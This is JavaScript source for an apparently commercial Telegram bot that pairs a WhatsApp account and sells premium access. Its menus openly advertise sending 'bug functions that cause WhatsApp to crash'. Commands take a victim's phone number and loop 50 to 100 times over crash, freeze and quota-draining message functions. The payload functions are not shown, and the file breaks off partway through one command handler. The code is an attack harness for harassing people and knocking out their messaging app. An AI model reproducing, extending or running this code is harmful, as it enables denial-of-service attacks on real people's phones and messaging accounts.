const { Telegraf } = require("telegraf");
const { spawn } = require('child_process')
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm')
const os = require('os')

const isModerator = (userId) => {
return false;};
const developerId = "7818764918"; 
const developerIds = ["7818764918", "7818764918"];
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    BufferJSON,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(tokenUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

const tokenUrl = 'https://raw.githubusercontent.com/cacaoverload/dbamelia/refs/heads/main/token.json';
const thumbnailUrl = "https://files.catbox.moe/papz3e.jpg";

(async () => {
    const isTokenValid = await isAuthorizedToken(tokenBot);
    if (!isTokenValid) {
        console.log(chalk.bold.yellow(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀


» Information:
  Developer: Amelia Modders
  Version: 19.0
  Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `))
        process.exit();
    }
})();

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '0@newsletter',
    newsletterName: '',
    caption: '\u200B'
}}}

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀


» Information:
  Developer: Amelia Modders
  Version: 19.0
  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'ΛPHӨPHIS CRASHER',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀


» Information:
  Developer: Amelia Modders
  Version: 19.0
  Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("reqpair", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /reqpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Number: ${phoneNumber}
─▢ Pairing Code: ${formattedCode}
─▢ Status: Not Connected
</pre>
</blockquote>`;

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: pairingMenu,
      parse_mode: "HTML"
    });

    sock.ev.on("connection.update", async (update) => {
      const { connection } = update;
      if (connection === "open") {
        const connectedMenu = `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Number: ${phoneNumber}
─▢ Pairing Code: ${formattedCode}
─▢ Status: Connected
</pre>
</blockquote>`;

        await ctx.replyWithPhoto(thumbnailUrl, {
          caption: connectedMenu,
          parse_mode: "HTML"
        });
      }
    });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal membuat kode pairing: " + err.message);
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka (dalam hari)");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.start(ctx => {
    const menuMessage = `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )
</pre>
</blockquote>`;


    const keyboard = [
        [
            {
                text: "⌜⚙️⌟ ☇ OPTIONS",
                callback_data: "/controls"
            },
            {
                text: "⌜🦠⌟ ☇ BUG MENU",
                callback_data: "/bug"
            },
        ],
        [
            {   text: "⌜👥⌟ ☇ THANK TO",
                callback_data: "/tqto"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const menuMessage = `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )
</pre>
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜⚙️⌟ ☇ OPTIONS",
                callback_data: "/controls"
            },
            {
                text: "⌜🦠⌟ ☇ BUG MENU",
                callback_data: "/bug"
            },
        ],
        [
            {   text: "⌜👥⌟ ☇ THANK TO",
                callback_data: "/tqto"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ /reqpair - add sender number
─▢ /addprem - add premium users
─▢ /delprem - delete premium users
</pre>
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ ☇ BACK",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ /uisystem - Nativeflow UI
─▢ /forcesystem - Force Close UI
─▢ /drainquota - Draining Quota
─▢ /lostiphone - Invisible Force Ios
─▢ /onehit - force no click 1 msg
─▢ /invis - delay hard
─▢ /sqlforce - Force Close Ori
─▢ /forceori - Force app
</pre>
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ ☇ BACK",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ @ameliamodders - Developer¹
─▢ @Gabrieltzyproooool - Developer²
─▢ @Urz1ee - My Support
</pre>
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ ☇ メニューに戻る",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("invis", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /invis 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: invis
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await locationX(target);
    await sleep(300);
    await CarouselLolipop(sock, target);
    await sleep(300);
    await Q(sock, target);
    await sleep(300);
    await DocuSql(target);
    await sleep(300);
    await amelDelayy(sock, target, true)
    await sleep(300);
    await amelaDeley(sock, target, mention = true)
    await sleep(300)
    await locationX(target);
    await QlayInvisible(sock, target);
    await CarouselLolipop(sock, target);
    await locationX(target);
    await sleep(300);
    await amelDelayy(sock, target, true)
    await sleep(300);
    await amelaDeley(sock, target, mention = true )
    await sleep(300);
    await Abcd(sock, target, true);
    await sleep(300);
    await Delayamel(sock, target, true)
    await sleep(300);
    await DelayMsg(target, ptcp = true);
    await TimerXDelay(target);
    await sleep(300);
    await CrashingX(sock, target, false);
    await sleep(300);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: invis
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("uisystem", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /uisystem 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Nativeflow UI
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await NativeflowUI(sock, target);
    await sleep(400);
    await ForcexUi(sock, target);
    await sleep(400);
    await FloodXCrlUI(target);
    await sleep(1000);
    await NewUIBetaNew(target, false);
    await sleep(200);
    await blanksimple(target, false);
    await sleep(200);
    await crashclick(sock, target);
    await sleep(200);
    await NativeflowUI(sock, target);
    await sleep(100);
    await UiImage(sock, target, false) 
    await sleep(300);
    await MakLoItam(sock, target) 
    await sleep(300);
    await urlNew(sock, target)
    await sleep(300);
    await crashclick(sock, target);
    await sleep(300);
    await FreezingUI(target);
    await sleep(300);
    await BlankUi(target, false);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: Nativeflow UI
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("forcesystem", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forcesystem 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Force Close UI
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await forceSystem(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: Force Close UI
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("drainquota", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drainquota 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Draining Quota
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

